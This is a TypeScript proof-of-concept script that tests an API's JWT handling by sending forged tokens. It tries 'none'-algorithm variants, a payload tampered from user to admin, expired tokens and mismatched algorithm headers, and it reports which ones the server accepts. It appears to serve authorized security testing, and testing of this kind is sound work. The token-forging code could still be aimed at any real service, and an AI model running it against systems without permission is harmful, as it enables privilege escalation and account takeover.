/**
 * PoC: JWT Token Manipulation Attacks
 * 
 * Tests for common JWT vulnerabilities:
 * 1. Algorithm Confusion (none algorithm)
 * 2. Key Confusion (RS256 -> HS256)
 * 3. Token Tampering
 * 4. Token Reuse After Logout
 * 
 * Run: npx ts-node security-tests/exploit-jwt-attacks.ts
 */

import axios, { AxiosResponse } from 'axios';
import * as crypto from 'crypto';

// Configuration - Update these values for your target
const API_BASE = 'https://api.security-test.site/api/v1';
const TIMEOUT = 10000;

// Helper: Check if response is HTML (frontend fallback) instead of API
function isHtmlResponse(response: AxiosResponse): boolean {
  const contentType = response.headers['content-type'] || '';
  const data = typeof response.data === 'string' ? response.data : '';
  return contentType.includes('text/html') || data.includes('<!doctype') || data.includes('<html');
}

// Helper: Check if blocked by Cloudflare
function isCloudflareBlocked(response: AxiosResponse): boolean {
  const data = typeof response.data === 'string' ? response.data : '';
  return data.includes('cf-browser-verification') || 
         data.includes('cloudflare') || 
         data.includes('challenge-platform');
}

// Helper: Base64URL encode
function base64UrlEncode(data: string | Buffer): string {
  const base64 = Buffer.isBuffer(data) 
    ? data.toString('base64')
    : Buffer.from(data).toString('base64');
  return base64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
}

// Helper: Create a forged JWT with "none" algorithm
function forgeNoneAlgorithmToken(payload: object): string {
  const header = { alg: 'none', typ: 'JWT' };
  const encodedHeader = base64UrlEncode(JSON.stringify(header));
  const encodedPayload = base64UrlEncode(JSON.stringify(payload));
  
  // "none" algorithm = no signature required
  return `${encodedHeader}.${encodedPayload}.`;
}

// Helper: Create token with lowercase "none"
function forgeNoneVariants(payload: object): string[] {
  const variants = ['none', 'None', 'NONE', 'nOnE', 'NonE'];
  
  return variants.map(alg => {
    const header = { alg, typ: 'JWT' };
    const encodedHeader = base64UrlEncode(JSON.stringify(header));
    const encodedPayload = base64UrlEncode(JSON.stringify(payload));
    return `${encodedHeader}.${encodedPayload}.`;
  });
}

async function testNoneAlgorithmAttack() {
  console.log('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—');
  console.log('â•‘     TEST #1: "none" Algorithm Attack                     â•‘');
  console.log('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n');
  
  // Malicious payload - attacker becomes admin
  const maliciousPayload = {
    sub: 'admin_user_id',
    email: 'admin@security-test.site',
    role: 'admin',
    tokenVersion: 1,
    fingerprint: 'bypass',
    iat: Math.floor(Date.now() / 1000),
    exp: Math.floor(Date.now() / 1000) + 3600,
    jti: 'forged-token-id'
  };
  
  console.log('[1] Forging token with "none" algorithm...');
  console.log('    Payload:', JSON.stringify(maliciousPayload, null, 2));
  
  const forgedTokens = forgeNoneVariants(maliciousPayload);
  
  for (const token of forgedTokens) {
    const header = JSON.parse(Buffer.from(token.split('.')[0], 'base64url').toString());
    console.log(`\n[2] Testing with alg="${header.alg}"...`);
    
    try {
      const response = await axios.get(`${API_BASE}/auth/me`, {
        headers: { 
          'Authorization': `Bearer ${token}`,
          'Accept': 'application/json'
        },
        timeout: TIMEOUT,
        validateStatus: () => true
      });
      
      // Check for false positives
      if (isHtmlResponse(response)) {
        console.log('    âš ï¸ Received HTML (frontend fallback) - cannot determine vulnerability');
        console.log('    This usually means the API endpoint is not being reached.');
        continue;
      }
      
      if (isCloudflareBlocked(response)) {
        console.log('    âš ï¸ Blocked by Cloudflare - cannot test from this IP');
        continue;
      }
      
      if (response.status === 200 && response.data?.data) {
        console.log('    ğŸš¨ CRITICAL: "none" algorithm ACCEPTED!');
        console.log('    Server is vulnerable to algorithm confusion attack!');
        console.log('    Response:', JSON.stringify(response.data, null, 2));
        return true;
      } else if (response.status === 401) {
        console.log(`    âœ… Rejected (401) - Good!`);
      } else {
        console.log(`    Response: ${response.status} - ${response.data?.message || 'Unknown'}`);
      }
    } catch (error: any) {
      console.log(`    Error: ${error.message}`);
    }
  }
  
  console.log('\nâœ… Server correctly rejects "none" algorithm tokens');
  return false;
}

async function testTokenTampering() {
  console.log('\n\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—');
  console.log('â•‘     TEST #2: Token Payload Tampering                     â•‘');
  console.log('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n');
  
  // Start with a valid token structure
  const originalHeader = { alg: 'HS256', typ: 'JWT' };
  const originalPayload = {
    sub: 'regular_user_id',
    email: 'user@example.com',
    role: 'user', // Original role
    tokenVersion: 1,
    iat: Math.floor(Date.now() / 1000),
    exp: Math.floor(Date.now() / 1000) + 3600
  };
  
  // Tampered payload - escalate to admin
  const tamperedPayload = {
    ...originalPayload,
    role: 'admin', // ESCALATED!
    email: 'admin@security-test.site'
  };
  
  console.log('[1] Creating tampered token (user -> admin)...');
  console.log('    Original role: "user"');
  console.log('    Tampered role: "admin"');
  
  const encodedHeader = base64UrlEncode(JSON.stringify(originalHeader));
  const encodedPayload = base64UrlEncode(JSON.stringify(tamperedPayload));
  // Keep original signature (will be invalid for tampered payload)
  const fakeSignature = base64UrlEncode(crypto.randomBytes(32));
  
  const tamperedToken = `${encodedHeader}.${encodedPayload}.${fakeSignature}`;
  
  console.log('\n[2] Testing tampered token against admin endpoint...');
  
  try {
    const response = await axios.get(`${API_BASE}/admin/users`, {
      headers: { 'Authorization': `Bearer ${tamperedToken}` },
      timeout: 5000,
      validateStatus: () => true
    });
    
    if (response.status === 200) {
      console.log('    ğŸš¨ CRITICAL: Tampered token accepted!');
      console.log('    Signature validation is BROKEN!');
      return true;
    } else {
      console.log(`    âœ… Rejected (${response.status}) - Signature validation working`);
    }
  } catch (error: any) {
    console.log(`    Error: ${error.message}`);
  }
  
  return false;
}

async function testTokenReuse() {
  console.log('\n\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—');
  console.log('â•‘     TEST #3: Token Reuse After Logout                    â•‘');
  console.log('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n');
  
  console.log('[1] This test requires a valid session:');
  console.log('    a) Login and capture access token');
  console.log('    b) Make a request (should succeed)');
  console.log('    c) Logout');
  console.log('    d) Reuse the same token (should fail)');
  console.log('\n    Manual testing recommended for this scenario.');
  
  console.log('\n[2] Token reuse protection mechanisms to verify:');
  console.log('    - tokenVersion increments on logout/password change');
  console.log('    - Refresh token marked as revoked in database');
  console.log('    - JTI blacklisting for access tokens (if implemented)');
  
  // This would require actual login flow
  console.log('\n    [Requires authenticated session for full test]');
}

async function testExpiredToken() {
  console.log('\n\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—');
  console.log('â•‘     TEST #4: Expired Token Acceptance                    â•‘');
  console.log('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n');
  
  const expiredPayload = {
    sub: 'user_id',
    email: 'user@example.com',
    role: 'user',
    tokenVersion: 1,
    iat: Math.floor(Date.now() / 1000) - 7200, // 2 hours ago
    exp: Math.floor(Date.now() / 1000) - 3600,  // Expired 1 hour ago
  };
  
  console.log('[1] Creating expired token (exp: 1 hour ago)...');
  
  // Note: This won't have valid signature, but tests exp check order
  const header = base64UrlEncode(JSON.stringify({ alg: 'HS256', typ: 'JWT' }));
  const payload = base64UrlEncode(JSON.stringify(expiredPayload));
  const sig = base64UrlEncode(crypto.randomBytes(32));
  
  const expiredToken = `${header}.${payload}.${sig}`;
  
  try {
    const response = await axios.get(`${API_BASE}/auth/me`, {
      headers: { 'Authorization': `Bearer ${expiredToken}` },
      timeout: 5000,
      validateStatus: () => true
    });
    
    console.log(`[2] Response: ${response.status}`);
    
    if (response.status === 401) {
      const message = response.data?.message || '';
      if (message.toLowerCase().includes('expired')) {
        console.log('    âœ… Token correctly rejected as expired');
      } else if (message.toLowerCase().includes('invalid')) {
        console.log('    âœ… Token rejected (invalid signature checked first)');
      }
    } else if (response.status === 200) {
      console.log('    ğŸš¨ CRITICAL: Expired token accepted!');
      return true;
    }
  } catch (error: any) {
    console.log(`    Error: ${error.message}`);
  }
  
  return false;
}

async function testAlgorithmHeader() {
  console.log('\n\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—');
  console.log('â•‘     TEST #5: Algorithm in Header vs Verification         â•‘');
  console.log('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n');
  
  console.log('[1] Testing algorithm consistency...');
  console.log('    Server should IGNORE algorithm from token header');
  console.log('    and use configured algorithm (HS256) only.\n');
  
  // Try different algorithms in header
  const algorithms = ['RS256', 'RS384', 'RS512', 'ES256', 'ES384', 'PS256'];
  
  for (const alg of algorithms) {
    const header = { alg, typ: 'JWT' };
    const payload = {
      sub: 'test_user',
      email: 'test@example.com',
      role: 'admin',
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + 3600
    };
    
    const encodedHeader = base64UrlEncode(JSON.stringify(header));
    const encodedPayload = base64UrlEncode(JSON.stringify(payload));
    const fakeSig = base64UrlEncode(crypto.randomBytes(32));
    
    const token = `${encodedHeader}.${encodedPayload}.${fakeSig}`;
    
    try {
      const response = await axios.get(`${API_BASE}/auth/me`, {
        headers: { 'Authorization': `Bearer ${token}` },
        timeout: 5000,
        validateStatus: () => true
      });
      
      if (response.status === 200) {
        console.log(`    ğŸš¨ Algorithm ${alg} accepted! Possible key confusion!`);
      } else {
        console.log(`    âœ… ${alg}: Rejected (${response.status})`);
      }
    } catch {}
  }
}

async function main() {
  console.log('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—');
  console.log('â•‘     JWT SECURITY TEST SUITE                                  â•‘');
  console.log('â•‘     Target: https://security-test.site                       â•‘');
  console.log('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n');
  
  console.log('âš ï¸  This is for authorized security testing only!\n\n');
  
  const results = {
    noneAlgorithm: await testNoneAlgorithmAttack(),
    tokenTampering: await testTokenTampering(),
    expiredToken: await testExpiredToken(),
  };
  
  await testTokenReuse();
  await testAlgorithmHeader();
  
  console.log('\n\n' + '='.repeat(60));
  console.log('FINAL RESULTS:');
  console.log('='.repeat(60));
  
  let critical = 0;
  
  if (results.noneAlgorithm) {
    console.log('ğŸš¨ CRITICAL: "none" algorithm attack successful');
    critical++;
  } else {
    console.log('âœ… PASS: "none" algorithm properly blocked');
  }
  
  if (results.tokenTampering) {
    console.log('ğŸš¨ CRITICAL: Token tampering attack successful');
    critical++;
  } else {
    console.log('âœ… PASS: Signature validation working');
  }
  
  if (results.expiredToken) {
    console.log('ğŸš¨ CRITICAL: Expired tokens accepted');
    critical++;
  } else {
    console.log('âœ… PASS: Expired tokens rejected');
  }
  
  console.log('\n' + '='.repeat(60));
  if (critical === 0) {
    console.log('âœ… All JWT security tests passed!');
  } else {
    console.log(`ğŸš¨ ${critical} CRITICAL vulnerabilities found!`);
  }
}

main().catch(console.error);
